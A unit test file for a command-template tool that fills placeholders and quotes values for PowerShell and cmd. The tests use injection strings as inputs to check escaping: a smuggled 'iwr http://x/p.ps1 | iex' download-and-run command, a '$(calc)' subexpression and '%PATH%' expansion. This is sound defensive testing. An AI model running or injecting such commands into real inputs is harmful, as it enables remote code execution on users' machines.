// Unit tests for placeholder parsing and quoting. Run with `pnpm test` (Node's built-in runner).
import assert from "node:assert/strict";
import { test } from "node:test";
import { commandVariables, fillVariables } from "../src/format.ts";

test("finds placeholders but not bcdedit identifiers, GUIDs or escapes", () => {
  assert.deepEqual(commandVariables("ping -n 4 {host}"), ["host"]);
  assert.deepEqual(commandVariables("bcdedit /set {current} safeboot minimal"), []);
  assert.deepEqual(commandVariables("bcdedit /enum {e2f84ce7-8efa-411c-aa69-97454b4b75b7}"), []);
  assert.deepEqual(commandVariables("echo {{host}} {a} {b:raw} {a}"), ["a", "b"]);
});

test("PowerShell values become single-quoted literals", () => {
  assert.equal(fillVariables("ping -n 4 {host}", { host: "example.com" }, "powershell"), "ping -n 4 'example.com'");
  assert.equal(
    fillVariables("ping {host}", { host: "example.com; iwr http://x/p.ps1 | iex" }, "powershell"),
    "ping 'example.com; iwr http://x/p.ps1 | iex'",
  );
  assert.equal(fillVariables("Remove-Item {p}", { p: "C:\\Old Photos\\Bob's" }, "powershell"), "Remove-Item 'C:\\Old Photos\\Bob''s'");
  assert.equal(fillVariables("echo {x}", { x: "it\u2019s $(calc)" }, "powershell"), "echo 'it\u2019\u2019s $(calc)'");
});

test("PowerShell values inside existing quotes are escaped, not re-quoted", () => {
  assert.equal(fillVariables("echo 'Hi {n}'", { n: "O'Neil" }, "powershell"), "echo 'Hi O''Neil'");
  assert.equal(fillVariables('echo "Hi {n}"', { n: 'a $b `c "d"' }, "powershell"), 'echo "Hi a `$b ``c `"d`""');
  assert.equal(fillVariables("echo \"a\" {n}", { n: "x y" }, "powershell"), "echo \"a\" 'x y'");
});

test("cmd values are double-quoted and unsafe characters are refused", () => {
  assert.equal(fillVariables("rd /s /q {folder}", { folder: "C:\\Users\\Me\\Old Photos" }, "cmd"), 'rd /s /q "C:\\Users\\Me\\Old Photos"');
  assert.equal(fillVariables('dir "{folder}"', { folder: "C:\\A & B" }, "cmd"), 'dir "C:\\A & B"');
  assert.throws(() => fillVariables("echo {x}", { x: 'a"b' }, "cmd"));
  assert.throws(() => fillVariables("echo {x}", { x: "%PATH%" }, "cmd"));
});

test("raw placeholders, escapes and missing values", () => {
  assert.equal(fillVariables("ping {args:raw}", { args: "-n 2 host" }, "powershell"), "ping -n 2 host");
  assert.equal(fillVariables("echo {{host}} {host}", { host: "h" }, "powershell"), "echo {host} 'h'");
  assert.equal(fillVariables("ping {host}", {}, "powershell"), "ping {host}");
  assert.equal(fillVariables("bcdedit /set {current} x", {}, "cmd"), "bcdedit /set {current} x");
});
